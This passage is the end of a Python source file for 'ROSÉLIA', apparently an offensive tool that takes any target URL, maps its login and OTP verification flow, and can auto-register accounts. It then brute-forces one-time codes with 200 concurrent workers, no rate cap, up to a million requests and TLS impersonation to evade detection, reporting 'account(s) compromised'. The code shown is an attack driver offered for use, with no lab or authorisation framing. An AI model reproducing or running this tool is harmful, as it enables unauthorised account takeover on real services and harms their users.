               "items": self.items}
        Path(path).write_text(json.dumps(doc, indent=2, default=str))
        return doc["merkle_root"]


def render_md(url, findings, flow, evidence, sent, probe_results):
    root = evidence.merkle_root()
    by = Counter(f.severity for f in findings.items)
    L = [f"# ROSÉLIA — {url}", "",
         f"**Author:** SYLHETYHACKVENGER (THE-ERROR808)",
         f"**Generated:** {now_utc()}",
         f"**Requests:** {sent}",
         f"**Merkle:** `{root[:16]}...`", "",
         "## Summary", "",
         "| Severity | Count |", "|----------|-------|"]
    for s in ("critical", "high", "medium", "low", "info"):
        L.append(f"| {s.title()} | {by.get(s, 0)} |")
    L += ["", "## Flow", "",
          f"- verify: `{flow.verify_url}`",
          f"- request: `{flow.request_url}`",
          f"- register: `{flow.register_url}`",
          f"- reset: `{flow.reset_url}`",
          f"- account: `{flow.account}`",
          f"- account 2: `{flow.account_2 or 'none'}`",
          f"- csrf field: `{flow.csrf_field or 'none'}`",
          f"- discovered fields: "
          f"`{','.join(flow.discovered_fields) or 'none'}`",
          f"- sessions: {len(flow.sessions)}",
          f"- reason: {flow.reason or 'ok'}",
          f"- baseline: {flow.baseline_status} "
          f"{flow.baseline_len}b",
          f"- baselines: {len(flow.baselines)}", ""]
    if flow.login_state:
        L += ["## Login State Machine"]
        for s in flow.login_state:
            L.append(f"- {s.get('step')}: "
                     f"{s.get('status')} "
                     f"({s.get('len', 0)}b) "
                     f"{s.get('location', '')[:80]}")
        L.append("")
    if probe_results:
        L += ["", "## Probe Results"]
        for r in probe_results:
            L.append(f"- [{r['probe']}] {r['detail']}")
    if findings.items:
        L += ["", "## Findings"]
        for f in sorted(findings.items,
                        key=lambda x: -SEVERITY_ORDER[x.severity]):
            L += [f"### {f.id} [{f.severity.upper()}] {f.title}", "",
                  f"**Category:** {f.category}  ",
                  f"**Endpoint:** `{f.endpoint}`  "]
            if f.cwe:
                L.append(f"**CWE:** {f.cwe}  ")
            L += ["", f.description, ""]
            if f.evidence:
                L += ["```json",
                      json.dumps(f.evidence, indent=2)[:1200],
                      "```"]
            if f.remediation:
                L.append(f"**Remediation:** {f.remediation}")
            L.append("")
    return "\n".join(L)


def render_html(url, findings, flow, evidence, sent, probe_results):
    md = render_md(url, findings, flow, evidence, sent, probe_results)
    h = ["<!DOCTYPE html><html><head><meta charset='utf-8'>",
         f"<title>ROSÉLIA — {url}</title>",
         "<style>body{font-family:monospace;background:#0d0d12;"
         "color:#eee;max-width:1100px;margin:2em auto;"
         "padding:1em}h1,h2,h3{color:#5f5}h1{border-bottom:2px "
         "solid #5f5}code{background:#1a1a22;padding:2px 4px}"
         "</style></head><body>"]
    for line in md.splitlines():
        if line.startswith("### "):
            h.append(f"<h3>{line[4:]}</h3>")
        elif line.startswith("## "):
            h.append(f"<h2>{line[3:]}</h2>")
        elif line.startswith("# "):
            h.append(f"<h1>{line[2:]}</h1>")
        elif line.startswith("- "):
            h.append(f"<li>{line[2:]}</li>")
        elif line.startswith("```"):
            h.append("<pre>")
        elif line.startswith("|"):
            h.append(f"<pre>{line}</pre>")
        elif not line.strip():
            h.append("<br>")
        else:
            h.append(f"<p>{line}</p>")
    h.append("</body></html>")
    return "\n".join(h)


def render_txt(url, findings, flow, evidence, sent, probe_results):
    root = evidence.merkle_root()
    L = [f"ROSÉLIA — {url}",
         f"Author: SYLHETYHACKVENGER (THE-ERROR808)",
         f"Generated: {now_utc()}",
         f"Requests: {sent}",
         f"Merkle: {root}", ""]
    L.append(f"Flow verify: {flow.verify_url}")
    L.append(f"Flow request: {flow.request_url}")
    L.append(f"Flow register: {flow.register_url}")
    L.append(f"Flow reset: {flow.reset_url}")
    L.append(f"Account: {flow.account}")
    L.append(f"CSRF field: {flow.csrf_field}")
    L.append(f"Reason: {flow.reason}")
    L.append(f"Baseline: {flow.baseline_status} {flow.baseline_len}b")
    L.append("")
    L.append("Probe results:")
    for r in probe_results:
        L.append(f"  [{r['probe']}] {r['detail']}")
    L.append("")
    for f in sorted(findings.items,
                    key=lambda x: -SEVERITY_ORDER[x.severity]):
        L.append(f"[{f.severity.upper()}] {f.id} {f.title}")
        L.append(f"  cat: {f.category}")
        L.append(f"  ep:  {f.endpoint}")
        if f.cwe:
            L.append(f"  cwe: {f.cwe}")
        L.append(f"  {f.description}")
        if f.evidence:
            L.append(f"  ev:  {json.dumps(f.evidence)[:400]}")
        if f.remediation:
            L.append(f"  fix: {f.remediation}")
        L.append("")
    return "\n".join(L)


def render_json(url, findings, flow, evidence, sent, probe_results):
    root = evidence.merkle_root()
    return json.dumps({
        "tool": "ROSÉLIA",
        "author": "SYLHETYHACKVENGER (THE-ERROR808)",
        "generated": now_utc(),
        "url": url,
        "requests": sent,
        "merkle_root": root,
        "flow": asdict(flow),
        "probes": probe_results,
        "findings": [f.to_json() for f in findings.items],
        "evidence": evidence.items,
    }, indent=2, default=str)


def render_xml(url, findings, flow, evidence, sent, probe_results):
    root = ET.Element("roselia")
    ET.SubElement(root, "author").text = \
        "SYLHETYHACKVENGER (THE-ERROR808)"
    ET.SubElement(root, "generated").text = now_utc()
    ET.SubElement(root, "url").text = url
    ET.SubElement(root, "requests").text = str(sent)
    ET.SubElement(root, "merkle_root").text = \
        evidence.merkle_root()
    fl = ET.SubElement(root, "flow")
    for k, v in asdict(flow).items():
        if isinstance(v, (dict, list)):
            v = json.dumps(v, default=str)
        ET.SubElement(fl, k).text = str(v)
    pr = ET.SubElement(root, "probes")
    for p in probe_results:
        pe = ET.SubElement(pr, "probe")
        for k, v in p.items():
            ET.SubElement(pe, k).text = str(v)
    fs = ET.SubElement(root, "findings")
    for f in findings.items:
        fe = ET.SubElement(fs, "finding", id=f.id)
        for k in ("title", "severity", "category", "endpoint",
                  "description", "remediation", "cwe"):
            ET.SubElement(fe, k).text = str(getattr(f, k, "") or "")
        ev = ET.SubElement(fe, "evidence")
        ev.text = json.dumps(f.evidence, default=str)
    ET.indent(root)
    return ET.tostring(root, encoding="unicode")


_ABORT = {"n": 0}


def _sigint(s, f):
    _ABORT["n"] += 1
    if _ABORT["n"] == 1:
        PANEL.emit(C.YELLOW, "INT",
                   "saving and stopping (Ctrl+C again = hard)")
        raise KeyboardInterrupt
    PANEL.emit(C.RED, "INT", "hard exit")
    os._exit(1)


def run_target(url, workers=200, rps=0, max_req=1000000,
               per_account_max=5000, digits=6,
               worker_id=0, total_workers=1,
               accounts=None, gen_accounts=0,
               no_probes=False, no_brute=False,
               resume_file=None, hits_file=None,
               verbose=False, wordlist=None, use_curl=True):
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    hostname = parsed.hostname or ""

    findings = Findings()
    evidence = Evidence(hostname + now_utc())
    sess = RotatingSession(verbose=verbose, use_curl=use_curl)
    flow = Flow()
    probe_results = []
    brute_hits = []

    PANEL.section("TARGET")
    PANEL.data("url", url)
    PANEL.data("host", hostname)
    PANEL.data("workers", str(workers))
    PANEL.data("rps cap", str(rps) if rps > 0 else "unlimited")
    PANEL.data("max requests", str(max_req))
    PANEL.data("per-account max", str(per_account_max))
    PANEL.data("worker id",
               f"{worker_id + 1}/{total_workers}")
    PANEL.data("probes", "OFF" if no_probes else "ON")
    PANEL.data("brute", "OFF" if no_brute else "ON")
    PANEL.data("curl_cffi",
               "YES" if (_HAVE_CURL and use_curl) else "NO")
    PANEL.data("esprima", "YES" if _HAVE_ESPRIMA else "NO")
    PANEL.end_section()

    PANEL.start_status()
    PANEL.set(status="recon")
    try:
        recon = Recon(sess, base_url, findings, wordlist)
        endpoints = recon.run()

        PANEL.set(status="flow")
        flow = FlowFinder(sess, base_url, findings,
                          endpoints).run()

        accs = list(accounts) if accounts else \
            ([flow.account] if flow.account else [])
        if gen_accounts > 0:
            PANEL.set(status="gen-accounts")
            reg_url = flow.register_url
            if reg_url:
                for _ in range(gen_accounts):
                    rand = random.randint(10 ** 8, 10 ** 9)
                    email = f"rose{rand}@example.test"
                    pwd = "R0s3!" + str(rand)
                    r = sess.post(reg_url, json={
                        "email": email, "password": pwd},
                        timeout=6)
                    if r is not None and getattr(
                            r, "status_code", 0) in (200, 201, 202):
                        text = getattr(r, "text", "") or ""
                        if not is_auth_page(text) and looks_json(r):
                            accs.append(email)
                            PANEL.data("gen account", email)
            PANEL.data("accounts", str(len(accs)))

        if not no_probes:
            PANEL.set(status="probes")
            probes = Probes(sess, flow, findings, base_url,
                            endpoints, recon.tech)
            probes.run()
            probe_results = probes.results
        else:
            PANEL.emit(C.YELLOW, "SKIP", "probes disabled")

        if not no_brute and flow.verify_url and accs:
            PANEL.set(status="brute")
            engine = AsyncEngine(concurrency=workers,
                                 verbose=verbose,
                                 use_curl=use_curl)
            try:
                asyncio.run(engine.start())
            except RuntimeError as e:
                if "Event loop is closed" not in str(e):
                    raise
            brute = Brute(
                flow=flow, findings=findings, engine=engine,
                workers=workers, rps=rps, max_req=max_req,
                per_account_max=per_account_max,
                digits=digits,
                worker_id=worker_id, total_workers=total_workers,
                accounts=accs,
                hits_file=hits_file, resume_file=resume_file)
            brute_hits = brute.run()
            if brute_hits:
                PANEL.emit(C.NEON, "RESULT",
                           f"{len(brute_hits)} account(s) compromised")
            else:
                PANEL.emit(C.YELLOW, "RESULT",
                           "no hit in this slice")
            try:
                asyncio.run(engine.close())
            except RuntimeError as e:
                if "Event loop is closed" not in str(e):
                    raise
        else:
            reason = []
            if no_brute:
                reason.append("brute disabled")
            if not flow.verify_url:
                reason.append("no verify url")
            if not accs:
                reason.append("no accounts")
            PANEL.emit(C.YELLOW, "SKIP",
                       "brute: " + ", ".join(reason))

    except KeyboardInterrupt:
        PANEL.emit(C.YELLOW, "INT", "graceful stop")
    except Exception as e:
        import traceback
        traceback.print_exc()
        PANEL.emit(C.RED, "ERR", str(e))

    PANEL.set(status="report")
    PANEL.stop_status()

    for f in findings.items:
        evidence.add("finding", f.to_json())

    PANEL.section("RESULTS")
    for f in sorted(findings.items,
                    key=lambda x: -SEVERITY_ORDER[x.severity]):
        col = {"critical": C.RED, "high": C.ORANGE,
               "medium": C.YELLOW, "low": C.CYAN,
               "info": C.NEON}.get(f.severity, C.NEON)
        PANEL.emit(col, f.severity.upper()[:4],
                   f"{f.id} {f.title}")
        PANEL.data("  category", f.category)
        PANEL.data("  endpoint", f.endpoint)
        if f.cwe:
            PANEL.data("  cwe", f.cwe)
        PANEL.data("  desc", f.description)
        if f.evidence:
            PANEL.data("  evidence",
                       json.dumps(f.evidence, default=str)[:400])
        if f.remediation:
            PANEL.data("  fix", f.remediation)
    PANEL.data("total findings", str(len(findings.items)))
    PANEL.data("requests", str(sess.sent))
    PANEL.data("merkle", evidence.merkle_root()[:16] + "...")
    if brute_hits:
        for acct, code in brute_hits:
            PANEL.data("brute hit", f"{acct} -> {code}")
    PANEL.end_section()

    PANEL.section("SAVE")
    print(f"{C.NEON}  Choose output format(s):{C.RESET}")
    print(f"    {C.NEON2}[1]{C.RESET} TXT")
    print(f"    {C.NEON2}[2]{C.RESET} JSON")
    print(f"    {C.NEON2}[3]{C.RESET} XML")
    print(f"    {C.NEON2}[4]{C.RESET} HTML")
    print(f"    {C.NEON2}[5]{C.RESET} MD")
    print(f"    {C.NEON2}[6]{C.RESET} ALL")
    print(f"    {C.NEON2}[0]{C.RESET} none")
    try:
        choice = input(
            f"{C.NEON}  ▸ selection "
            f"[{C.GREY}default 6{C.RESET}]: ").strip() or "6"
    except (EOFError, KeyboardInterrupt):
        choice = "0"

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = re.sub(r"[^a-zA-Z0-9.-]", "_", hostname)
    out = Path("roselia_output")
    out.mkdir(exist_ok=True)
    base = out / f"{safe}_{ts}"
    written = []

    def _w(ext, content):
        p = base.with_suffix("." + ext)
        p.write_text(content)
        written.append(p)

    if choice in ("1", "6"):
        _w("txt", render_txt(url, findings, flow, evidence,
                             sess.sent, probe_results))
    if choice in ("2", "6"):
        _w("json", render_json(url, findings, flow, evidence,
                               sess.sent, probe_results))
    if choice in ("3", "6"):
        _w("xml", render_xml(url, findings, flow, evidence,
                             sess.sent, probe_results))
    if choice in ("4", "6"):
        _w("html", render_html(url, findings, flow, evidence,
                               sess.sent, probe_results))
    if choice in ("5", "6"):
        _w("md", render_md(url, findings, flow, evidence,
                           sess.sent, probe_results))
    _w("evidence.jsonld", json.dumps({
        "generated": now_utc(),
        "merkle_root": evidence.merkle_root(),
        "items": evidence.items,
    }, indent=2, default=str))

    if written:
        for p in written:
            PANEL.data("saved", str(p))
    else:
        PANEL.emit(C.GREY, "FILE", "nothing saved")
    PANEL.end_section()


def ask(prompt, default=""):
    try:
        v = input(f"{C.NEON}  ▸{C.RESET} {prompt} "
                  f"{C.GREY}[{default}]{C.RESET}: ").strip()
        return v or default
    except (EOFError, KeyboardInterrupt):
        return default


def interactive():
    print(BANNER)
    print(f"{C.NEON}{C.BOLD}  Choose mode:{C.RESET}")
    print(f"    {C.NEON2}[1]{C.RESET} Smart — auto")
    print(f"    {C.NEON2}[2]{C.RESET} Manual — configure")
    print()
    choice = ask("Mode", "1")
    url = ask("Target URL")
    if not url:
        PANEL.emit(C.RED, "ERR", "no url")
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    if choice == "1":
        run_target(url)
        return

    PANEL.section("MANUAL")
    workers = int(ask("Workers", "200"))
    rps = float(ask("RPS cap (0 = unlimited)", "0"))
    max_req = int(ask("Max requests", "1000000"))
    per_acc = int(ask("Per-account max attempts", "5000"))
    digits = int(ask("OTP digits", "6"))
    worker_id = int(ask("Worker id (0-based)", "0"))
    total_workers = int(ask("Total workers", "1"))
    gen = int(ask("Auto-generate N extra accounts", "0"))
    acc_file = ask("Accounts file (blank = discovered)", "")
    accounts = None
    if acc_file:
        p = Path(acc_file)
        if p.exists():
            accounts = [l.strip()
                        for l in p.read_text().splitlines()
                        if l.strip() and not l.startswith("#")]
    wl = ask("Wordlist file (blank = builtin ~800)", "")
    resume = ask("Resume file (blank = none)", "")
    hits = ask("Hits file (blank = none)", "")
    use_curl = ask("Use curl_cffi TLS impersonate? (Y/n)",
                   "Y").lower() != "n"
    probes_off = ask("Skip probes? (y/N)", "N").lower() == "y"
    brute_off = ask("Skip brute? (y/N)", "N").lower() == "y"
    verbose = ask("Verbose HTTP log? (y/N)", "N").lower() == "y"
    PANEL.end_section()

    run_target(url, workers=workers, rps=rps, max_req=max_req,
               per_account_max=per_acc, digits=digits,
               worker_id=worker_id, total_workers=total_workers,
               accounts=accounts, gen_accounts=gen,
               no_probes=probes_off, no_brute=brute_off,
               resume_file=resume or None,
               hits_file=hits or None, verbose=verbose,
               wordlist=wl or None, use_curl=use_curl)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _sigint)

    if len(sys.argv) == 1:
        interactive()
        sys.exit(0)

    if sys.argv[1] in ("-h", "--help"):
        print(BANNER)
        print("Usage:")
        print("  roselia.py                    interactive")
        print("  roselia.py <url>              auto")
        print("  roselia.py <url> [options]    manual")
        print()
        print("Options:")
        print("  --workers N           concurrency (200)")
        print("  --rps N               rps cap (0=unlimited)")
        print("  --max N               max requests (1M)")
        print("  --per-account-max N   per-account (5000)")
        print("  --digits N            otp digits (6)")
        print("  --worker-id N         slice id (0-based)")
        print("  --total-workers N     parallel workers")
        print("  --accounts FILE       account list")
        print("  --gen-accounts N      auto-register N accounts")
        print("  --wordlist FILE       wordlist (~800 builtin)")
        print("  --resume FILE         resume-file")
        print("  --hits FILE           hits-file")
        print("  --verbose             print HTTP per request")
        print("  --no-curl             disable curl_cffi impersonate")
        print("  --no-probes           skip OTP probes")
        print("  --no-brute            skip brute force")
        sys.exit(0)

    import argparse
    ap = argparse.ArgumentParser(add_help=False)
    ap.add_argument("url")
    ap.add_argument("--workers", type=int, default=200)
    ap.add_argument("--rps", type=float, default=0)
    ap.add_argument("--max", type=int, default=1000000)
    ap.add_argument("--per-account-max", type=int, default=5000)
    ap.add_argument("--digits", type=int, default=6)
    ap.add_argument("--worker-id", type=int, default=0)
    ap.add_argument("--total-workers", type=int, default=1)
    ap.add_argument("--accounts", default="")
    ap.add_argument("--gen-accounts", type=int, default=0)
    ap.add_argument("--wordlist", default="")
    ap.add_argument("--resume", default="")
    ap.add_argument("--hits", default="")
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--no-curl", action="store_true")
    ap.add_argument("--no-probes", action="store_true")
    ap.add_argument("--no-brute", action="store_true")
    args = ap.parse_args()

    u = args.url
    if not u.startswith(("http://", "https://")):
        u = "https://" + u

    accounts = None
    if args.accounts:
        p = Path(args.accounts)
        if p.exists():
            accounts = [l.strip()
                        for l in p.read_text().splitlines()
                        if l.strip() and not l.startswith("#")]

    run_target(u, workers=args.workers, rps=args.rps,
               max_req=args.max,
               per_account_max=args.per_account_max,
               digits=args.digits,
               worker_id=args.worker_id,
               total_workers=args.total_workers,
               accounts=accounts, gen_accounts=args.gen_accounts,
               no_probes=args.no_probes,
               no_brute=args.no_brute,
               resume_file=args.resume or None,
               hits_file=args.hits or None,
               verbose=args.verbose,
               wordlist=args.wordlist or None,
               use_curl=not args.no_curl)
